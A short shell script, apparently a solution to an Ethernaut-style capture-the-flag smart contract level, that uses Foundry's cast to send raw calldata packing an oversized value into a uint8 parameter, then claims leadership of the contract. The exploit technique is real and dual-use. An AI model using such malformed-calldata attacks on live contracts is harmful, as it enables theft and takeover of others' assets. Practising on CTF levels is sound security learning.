source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# Trivial CTF after the last one LOL

# "registerTreasury(uint8)()"
# cast sig "registerTreasury(uint8)"  -> 0x 211c85ab
# in treasury it wants to load 4th item of the calldata
# 0x  sig
# 0x  211c85ab    00  00  0xffff
# 0x sig 0x00..0fff

cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0xF8aC5DC9D83132809A71e2d19D89650E7F4bFd25 \
    0x211c85ab0000000000000000000000000000000000000000000000000000000000000fff

cast call \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0xF8aC5DC9D83132809A71e2d19D89650E7F4bFd25 \
    "treasury()(uint256)"

cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    0xF8aC5DC9D83132809A71e2d19D89650E7F4bFd25 \
    "claimLeadership()()"

cast call \
    --rpc-url $RPC_URL \
    0xF8aC5DC9D83132809A71e2d19D89650E7F4bFd25 \
    "commander()(address)"
